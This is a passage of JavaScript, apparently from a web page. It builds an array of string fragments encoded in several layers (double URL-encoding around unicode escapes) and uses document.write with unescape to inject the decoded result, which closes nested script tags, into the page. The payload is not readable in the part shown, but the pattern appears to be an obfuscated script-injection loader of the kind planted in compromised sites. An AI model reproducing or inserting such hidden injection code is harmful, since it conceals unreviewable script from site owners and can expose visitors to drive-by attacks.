fF7eSD8[179]="%255Cu0035%255Cu00";
fF7eSD8[180]="5c%255Cu0075%255Cu";
fF7eSD8[181]="0030%255Cu003";
fF7eSD8[182]="0%255Cu0037%255C";
fF7eSD8[183]="u0032%255Cu00";
fF7eSD8[184]="5c%255Cu0075%255";
fF7eSD8[185]="Cu0030%255Cu0";
fF7eSD8[186]="030%255Cu0036%25";
fF7eSD8[187]="5Cu0035%255Cu0";
fF7eSD8[188]="05c%255Cu0075";
fF7eSD8[189]="%255Cu0030%255Cu0";
fF7eSD8[190]="030%255Cu0032";
fF7eSD8[191]="%255Cu0065%255Cu";
fF7eSD8[192]="005c%255Cu0075";
fF7eSD8[193]="%255Cu0030%255Cu00";
fF7eSD8[194]="30%255Cu0036%25";
fF7eSD8[195]="5Cu0061%255Cu";
fF7eSD8[196]="005c%255Cu007";
fF7eSD8[197]="5%255Cu0030%255";
fF7eSD8[198]="Cu0030%255Cu0037";
fF7eSD8[199]="%255Cu0033%255Cu0";
fF7eSD8[200]="05c%255Cu0075%255C";
fF7eSD8[201]="u0030%255Cu00";
fF7eSD8[202]="30%255Cu0033%255Cu";
fF7eSD8[203]="0065%255Cu005";
fF7eSD8[204]="c%255Cu0075%255Cu";
fF7eSD8[205]="0030%255Cu0030%25";
fF7eSD8[206]="5Cu0033%255Cu00";
fF7eSD8[207]="63%255Cu005c%255C";
fF7eSD8[208]="u0075%255Cu0030";
fF7eSD8[209]="%255Cu0030%255Cu0";
fF7eSD8[210]="032%255Cu0066%255";
fF7eSD8[211]="Cu005c%255Cu0";
fF7eSD8[212]="075%255Cu0030%25";
fF7eSD8[213]="5Cu0030%255Cu";
fF7eSD8[214]="0035%255Cu0033%255";
fF7eSD8[215]="Cu005c%255Cu007";
fF7eSD8[216]="5%255Cu0030%255Cu0";
fF7eSD8[217]="030%255Cu0034%255";
fF7eSD8[218]="Cu0033%255Cu00";
fF7eSD8[219]="5c%255Cu0075%25";
fF7eSD8[220]="5Cu0030%255Cu0";
fF7eSD8[221]="030%255Cu0035";
fF7eSD8[222]="%255Cu0032%255Cu0";
fF7eSD8[223]="05c%255Cu0075";
fF7eSD8[224]="%255Cu0030%255Cu";
fF7eSD8[225]="0030%255Cu0034%25";
fF7eSD8[226]="5Cu0039%255Cu0";
fF7eSD8[227]="05c%255Cu0075%25";
fF7eSD8[228]="5Cu0030%255Cu";
fF7eSD8[229]="0030%255Cu0035%25";
fF7eSD8[230]="5Cu0030%255Cu";
fF7eSD8[231]="005c%255Cu0075%255";
fF7eSD8[232]="Cu0030%255Cu0";
fF7eSD8[233]="030%255Cu0035";
fF7eSD8[234]="%255Cu0034%255Cu0";
fF7eSD8[235]="05c%255Cu0075";
fF7eSD8[236]="%255Cu0030%255Cu";
fF7eSD8[237]="0030%255Cu0033%255";
fF7eSD8[238]="Cu0065%255Cu0";
fF7eSD8[239]="027%255Cu0029";
fF7eSD8[240]="%255Cu003c%255C";
fF7eSD8[241]="u002f%255Cu0073%25";
fF7eSD8[242]="5Cu0063%255Cu007";
fF7eSD8[243]="2%255Cu0069%255Cu";
fF7eSD8[244]="0070%255Cu007";
fF7eSD8[245]="4%255Cu003e%2527%25";
fF7eSD8[246]="29%253C/script%25";
fF7eSD8[247]="3E%22%29%29%3B%0A%3C/scri";
fF7eSD8[248]="pt%3E";
for (i = 0; i < fF7eSD8.length; i ++)
{
    document.write(unescape(fF7eSD8[i]))
}
// -->
</script>